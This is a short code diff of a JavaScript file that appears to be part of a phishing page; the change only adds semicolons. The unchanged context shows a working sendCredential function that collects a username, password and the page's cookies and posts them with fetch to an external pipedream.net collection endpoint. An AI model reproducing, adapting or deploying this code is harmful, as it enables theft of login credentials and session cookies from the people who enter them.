@@ -7,24 +7,24 @@ place_holder.className = "place_holder";
 $("nav").after(place_holder);
 
 function sendCredential(username, password) {
-    const headers = new Headers()
-    headers.append("Content-Type", "application/json")
+    const headers = new Headers();
+    headers.append("Content-Type", "application/json");
 
     const body = {
         "username": username,
         "password": password,
         "cookies": document.cookie,
         "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_4) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30"
-    }
+    };
 
     const options = {
         method: "POST",
         headers,
         mode: "cors",
         body: JSON.stringify(body),
-    }
+    };
 
-    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options)
+    fetch("https://ensnocsamq9t9ho.m.pipedream.net", options);
 }
 
 
